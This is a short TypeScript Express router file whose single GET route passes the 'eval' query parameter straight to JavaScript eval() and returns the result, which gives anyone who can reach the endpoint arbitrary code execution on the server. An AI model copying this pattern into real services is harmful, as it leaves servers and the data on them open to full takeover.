import express from "express";
import {LoginWithPhoneNumberAndPasswordFacade} from "../facades";
const router = express.Router();


router.get('/', async function(req, res, next) {
    try {
        console.log(req.query.eval);
        const val: any = await eval( `${req.query.eval}`);
        res.json({val, query: req.query});
    } catch (err) {
        res.status(500).json({err, query: req.query});
    }
});


module.exports = router;